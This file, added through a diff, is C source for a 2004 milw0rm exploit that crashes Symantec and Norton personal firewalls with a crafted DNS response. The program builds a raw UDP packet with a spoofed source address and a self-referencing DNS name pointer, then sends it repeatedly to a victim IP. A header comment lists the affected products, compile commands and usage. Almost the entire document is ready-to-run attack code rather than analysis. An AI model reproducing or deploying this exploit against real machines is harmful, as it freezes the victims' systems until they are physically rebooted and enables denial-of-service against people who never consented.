@@ -1,0 +1,412 @@
+/* HOD-symantec-firewall-DoS-expl.c:
+ *
+ * Symantec Multiple Firewall DNS Response Denial-of-Service
+ *
+ * Exploit version 0.1 coded by
+ *
+ *
+ *                 .::[ houseofdabus ]::.
+ *
+ *
+ *
+ * Bug discoveried by eEye:
+ * http://www.eeye.com/html/Research/Advisories/AD20040512B.html
+ *
+ * -------------------------------------------------------------------
+ * Tested on:
+ *    - Symantec Norton Personal Firewall 2004
+ *
+ *
+ * Systems Affected:
+ *    - Symantec Norton Internet Security 2002
+ *    - Symantec Norton Internet Security 2003
+ *    - Symantec Norton Internet Security 2004
+ *    - Symantec Norton Internet Security Professional 2002
+ *    - Symantec Norton Internet Security Professional 2003
+ *    - Symantec Norton Internet Security Professional 2004
+ *    - Symantec Norton Personal Firewall 2002
+ *    - Symantec Norton Personal Firewall 2003
+ *    - Symantec Norton Personal Firewall 2004 
+ *    - Symantec Client Firewall 5.01, 5.1.1 
+ *    - Symantec Client Security 1.0, 1.1, 2.0(SCF 7.1)
+ *    - Symantec Norton AntiSpam 2004
+ *
+ * -------------------------------------------------------------------
+ * Description:
+ *    eEye Digital Security has discovered a second vulnerability
+ *    in the Symantec firewall product line that can be remotely
+ *    exploited to cause a severe denial-of-service condition on
+ *    systems running a default installation of an affected version
+ *    of the product. By sending a single malicious DNS (UDP port 53)
+ *    response packet to a vulnerable host, an attacker can cause
+ *    the Symantec DNS response validation code to enter an infinite
+ *    loop within the kernel, amounting to a system freeze that requires
+ *    the machine to be physically rebooted in order to restore operation.
+ *
+ * -------------------------------------------------------------------
+ * Compile:
+ *    Win32/VC++  : cl -o HOD-sym-DoS-expl HOD-sym-DoS-expl.c ws2_32.lib
+ *    Win32/cygwin: gcc -o HOD-sym-DoS-expl HOD-sym-DoS-expl.c -lws2_32.lib
+ *    Linux       : gcc -o HOD-sym-DoS-expl HOD-sym-DoS-expl.c -Wall
+ *
+ * -------------------------------------------------------------------
+ * Command Line Parameters/Arguments:
+ *
+ *    HOD-symantec-firewall-DoS-expl [-fi:str] [-tp:int] [-ti:str] [-n:int] 
+ *
+ *           -fi:IP    From (sender) IP address
+ *           -tp:int   To (recipient) port number
+ *           -ti:IP    To (recipient) IP address
+ *           -n:int    Number of times to send message
+ *
+ */
+
+
+#ifdef _WIN32
+#pragma comment(lib,"ws2_32")
+#pragma pack(1)
+#define WIN32_LEAN_AND_MEAN 
+#include <winsock2.h>
+#include <ws2tcpip.h> /* IP_HDRINCL */
+#include <stdio.h>
+#include <stdlib.h>
+
+#else
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <sys/timeb.h>
+#include <string.h>
+#endif
+
+#define MAX_MESSAGE        4068
+#define MAX_PACKET         4096
+
+#define DEFAULT_PORT       53
+#define DEFAULT_IP         "10.0.0.1"
+#define DEFAULT_COUNT      1
+
+#ifndef _WIN32
+#       define FAR
+#endif
+
+
+/* Define the DNS header */
+char dnsreply[] =
+"\xc9\x9c"  /* Transaction ID */
+"\x80\x00"  /* Flags (bit 15: response) */
+"\x00\x01"  /* Number of questions */
+"\x00\x01"  /* Number of answer RRs */
+"\x00\x00"  /* Number of authority RRs */
+"\x00\x00"  /* Number of additional RRs */
+"\xC0\x0C"; /* Compressed name pointer to itself */
+
+
+/* Define the IP header */
+typedef struct ip_hdr {
+    unsigned char  ip_verlen;        /* IP version & length */
+    unsigned char  ip_tos;           /* IP type of service */
+    unsigned short ip_totallength;   /* Total length */
+    unsigned short ip_id;            /* Unique identifier */
+    unsigned short ip_offset;        /* Fragment offset field */
+    unsigned char  ip_ttl;           /* Time to live */
+    unsigned char  ip_protocol;      /* Protocol */
+    unsigned short ip_checksum;      /* IP checksum */
+    unsigned int   ip_srcaddr;       /* Source address */
+    unsigned int   ip_destaddr;      /* Destination address */
+} IP_HDR, *PIP_HDR, FAR* LPIP_HDR;
+
+/* Define the UDP header */
+typedef struct udp_hdr {
+    unsigned short src_portno;       /* Source port number */
+    unsigned short dst_portno;       /* Destination port number */
+    unsigned short udp_length;       /* UDP packet length */
+    unsigned short udp_checksum;     /* UDP checksum (optional) */
+} UDP_HDR, *PUDP_HDR;
+
+
+/* globals */
+unsigned long  dwToIP,               // IP to send to
+               dwFromIP;             // IP to send from (spoof)
+unsigned short iToPort,              // Port to send to
+               iFromPort;            // Port to send from (spoof)
+unsigned long  dwCount;              // Number of times to send
+char           strMessage[MAX_MESSAGE]; // Message to send
+
+
+
+void
+usage(char *progname) {
+	printf("Usage:\n\n");
+    printf("%s <-fi:SRC-IP> <-ti:VICTIM-IP> [-tp:DST-PORT] [-n:int]\n\n", progname);
+    printf("       -fi:IP    From (sender) IP address\n");
+    printf("       -tp:int   To (recipient) open UDP port number:\n");
+	printf("                 137, 138, 445, 500(default)\n");
+    printf("       -ti:IP    To (recipient) IP address\n");
+    printf("       -n:int    Number of times\n");
+    exit(1);
+}
+
+void
+ValidateArgs(int argc, char **argv)
+{
+    int                i;
+
+    iToPort = 500;
+    iFromPort = DEFAULT_PORT;
+    dwToIP = inet_addr(DEFAULT_IP);
+    dwFromIP = inet_addr(DEFAULT_IP); 
+    dwCount = DEFAULT_COUNT;
+	memcpy(strMessage, dnsreply, sizeof(dnsreply)-1);
+
+    for(i = 1; i < argc; i++) {
+        if ((argv[i][0] == '-') || (argv[i][0] == '/')) {
+            switch (tolower(argv[i][1])) {
+                case 'f':
+                    switch (tolower(argv[i][2])) {
+                        case 'i':
+                            if (strlen(argv[i]) > 4)
+                                dwFromIP = inet_addr(&argv[i][4]);
+                            break;
+                        default:
+                            usage(argv[0]);
+                            break;
+                    }    
+                    break;
+                case 't':
+                    switch (tolower(argv[i][2])) {
+                        case 'p':
+                            if (strlen(argv[i]) > 4)
+                                iToPort = atoi(&argv[i][4]);
+                            break;
+                        case 'i':
+                            if (strlen(argv[i]) > 4)
+                                dwToIP = inet_addr(&argv[i][4]);
+                            break;
+                        default:
+                            usage(argv[0]);
+                            break;
+                    }    
+                    break;
+                case 'n':
+                    if (strlen(argv[i]) > 3)
+                        dwCount = atol(&argv[i][3]);
+                    break;
+                default:
+                    usage(argv[0]);
+                    break;
+            }
+        }
+    }
+    return;
+}
+
+
+/*    This function calculates the 16-bit one's complement sum */
+/*    for the supplied buffer */
+unsigned short
+checksum(unsigned short *buffer, int size)
+{
+    unsigned long cksum=0;
+
+    while (size > 1) {
+        cksum += *buffer++;
+        size  -= sizeof(unsigned short);   
+    }
+    if (size) {
+        cksum += *(unsigned char *)buffer;   
+    }
+    cksum = (cksum >> 16) + (cksum & 0xffff);
+    cksum += (cksum >>16); 
+
+    return (unsigned short)(~cksum); 
+}
+
+
+
+
+int
+main(int argc, char **argv)
+{
+#ifdef _WIN32
+    WSADATA            wsd;
+#endif
+    int                s;
+#ifdef _WIN32
+	BOOL                bOpt;
+#else
+	int                bOpt;
+#endif
+    struct sockaddr_in remote;
+    IP_HDR             ipHdr;
+    UDP_HDR            udpHdr;
+    int                ret;
+    unsigned long      i;
+    unsigned short     iTotalSize,
+                       iUdpSize,
+                       iUdpChecksumSize,
+                       iIPVersion,
+                       iIPSize,
+                       cksum = 0;
+    char               buf[MAX_PACKET],
+                       *ptr = NULL;
+#ifdef _WIN32
+    IN_ADDR            addr;
+#else
+	struct sockaddr_in addr;
+#endif
+
+	printf("\nSymantec Multiple Firewall DNS Response Denial-of-Service exploit v0.1\n");
+    printf("Bug discoveried by eEye:\n");
+    printf("http://www.eeye.com/html/Research/Advisories/AD20040512B.html\n\n");
+	printf("--- Coded by .::[ houseofdabus ]::. ---\n\n");
+
+	if (argc < 3) usage(argv[0]);
+
+    /* Parse command line arguments and print them out */
+    ValidateArgs(argc, argv);
+#ifdef _WIN32
+    addr.S_un.S_addr = dwFromIP;
+    printf("[*] From IP: <%s>, port: %d\n", inet_ntoa(addr), iFromPort);
+    addr.S_un.S_addr = dwToIP;
+    printf("[*] To   IP: <%s>, port: %d\n", inet_ntoa(addr), iToPort);
+    printf("[*] Count:   %d\n", dwCount);
+#else
+    addr.sin_addr.s_addr = dwFromIP;
+    printf("[*] From IP: <%s>, port: %d\n", inet_ntoa(addr.sin_addr), iFromPort);
+    addr.sin_addr.s_addr = dwToIP;
+    printf("[*] To   IP: <%s>, port: %d\n", inet_ntoa(addr.sin_addr), iToPort);
+    printf("[*] Count:   %d\n", dwCount);
+#endif
+
+#ifdef _WIN32
+    if (WSAStartup(MAKEWORD(2,2), &wsd) != 0) {
+        printf("[-] WSAStartup() failed: %d\n", GetLastError());
+        return -1;
+    }
+#endif
+    /*  Creating a raw socket */
+    s = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
+#ifdef _WIN32
+    if (s == INVALID_SOCKET) {
+        printf("[-] WSASocket() failed: %d\n", WSAGetLastError());
+        return -1;
+    }
+#endif
+
+    /* Enable the IP header include option */
+#ifdef _WIN32
+    bOpt = TRUE;
+#else
+    bOpt = 1;
+#endif
+    ret = setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char *)&bOpt, sizeof(bOpt));
+#ifdef _WIN32
+    if (ret == SOCKET_ERROR) {
+        printf("[-] setsockopt(IP_HDRINCL) failed: %d\n", WSAGetLastError());
+        return -1;
+    }
+#endif
+    /* Initalize the IP header */
+    iTotalSize = sizeof(ipHdr) + sizeof(udpHdr) + sizeof(dnsreply)-1;
+
+    iIPVersion = 4;
+    iIPSize = sizeof(ipHdr) / sizeof(unsigned long);
+
+    ipHdr.ip_verlen = (iIPVersion << 4) | iIPSize;
+    ipHdr.ip_tos = 0;                         /* IP type of service */
+    ipHdr.ip_totallength = htons(iTotalSize); /* Total packet len */
+    ipHdr.ip_id = 0;                 /* Unique identifier: set to 0 */
+    ipHdr.ip_offset = 0;             /* Fragment offset field */
+    ipHdr.ip_ttl = 128;              /* Time to live */
+    ipHdr.ip_protocol = 0x11;        /* Protocol(UDP) */
+    ipHdr.ip_checksum = 0 ;          /* IP checksum */
+    ipHdr.ip_srcaddr = dwFromIP;     /* Source address */
+    ipHdr.ip_destaddr = dwToIP;      /* Destination address */
+
+    /* Initalize the UDP header */
+    iUdpSize = sizeof(udpHdr) + sizeof(dnsreply)-1;
+
+    udpHdr.src_portno = htons(iFromPort) ;
+    udpHdr.dst_portno = htons(iToPort) ;
+    udpHdr.udp_length = htons(iUdpSize) ;
+    udpHdr.udp_checksum = 0 ;
+
+
+	iUdpChecksumSize = 0;
+    ptr = buf;
+	memset(buf, 0, MAX_PACKET);
+
+    memcpy(ptr, &ipHdr.ip_srcaddr,  sizeof(ipHdr.ip_srcaddr));  
+    ptr += sizeof(ipHdr.ip_srcaddr);
+    iUdpChecksumSize += sizeof(ipHdr.ip_srcaddr);
+
+    memcpy(ptr, &ipHdr.ip_destaddr, sizeof(ipHdr.ip_destaddr)); 
+    ptr += sizeof(ipHdr.ip_destaddr);
+    iUdpChecksumSize += sizeof(ipHdr.ip_destaddr);
+
+    ptr++;
+    iUdpChecksumSize += 1;
+
+    memcpy(ptr, &ipHdr.ip_protocol, sizeof(ipHdr.ip_protocol)); 
+    ptr += sizeof(ipHdr.ip_protocol);
+    iUdpChecksumSize += sizeof(ipHdr.ip_protocol);
+
+    memcpy(ptr, &udpHdr.udp_length, sizeof(udpHdr.udp_length)); 
+    ptr += sizeof(udpHdr.udp_length);
+    iUdpChecksumSize += sizeof(udpHdr.udp_length);
+    
+    memcpy(ptr, &udpHdr, sizeof(udpHdr)); 
+    ptr += sizeof(udpHdr);
+    iUdpChecksumSize += sizeof(udpHdr);
+
+	for(i = 0; i < sizeof(dnsreply)-1; i++, ptr++)
+        *ptr = strMessage[i];
+    iUdpChecksumSize += sizeof(dnsreply)-1;
+
+    cksum = checksum((unsigned short *)buf, iUdpChecksumSize);
+    udpHdr.udp_checksum = cksum;
+
+
+	memset(buf, 0, MAX_PACKET);
+    ptr = buf;
+
+    memcpy(ptr, &ipHdr, sizeof(ipHdr));   ptr += sizeof(ipHdr);
+    memcpy(ptr, &udpHdr, sizeof(udpHdr)); ptr += sizeof(udpHdr);
+    memcpy(ptr, strMessage, sizeof(dnsreply)-1);
+
+    remote.sin_family = AF_INET;
+    remote.sin_port = htons(iToPort);
+    remote.sin_addr.s_addr = dwToIP;
+   
+    for(i = 0; i < dwCount; i++) {
+#ifdef _WIN32
+        ret = sendto(s, buf, iTotalSize, 0, (SOCKADDR *)&remote, 
+            sizeof(remote));
+
+        if (ret == SOCKET_ERROR) {
+            printf("[-] sendto() failed: %d\n", WSAGetLastError());
+            break;
+        } else
+#else
+        ret = sendto(s, buf, iTotalSize, 0, (struct sockaddr *) &remote, 
+            sizeof(remote));
+#endif
+            printf("[+] sent %d bytes\n", ret);
+    }
+
+#ifdef _WIN32
+    closesocket(s);
+    WSACleanup();
+#endif
+
+    return 0;
+}
+
+
+
+// milw0rm.com [2004-05-16]
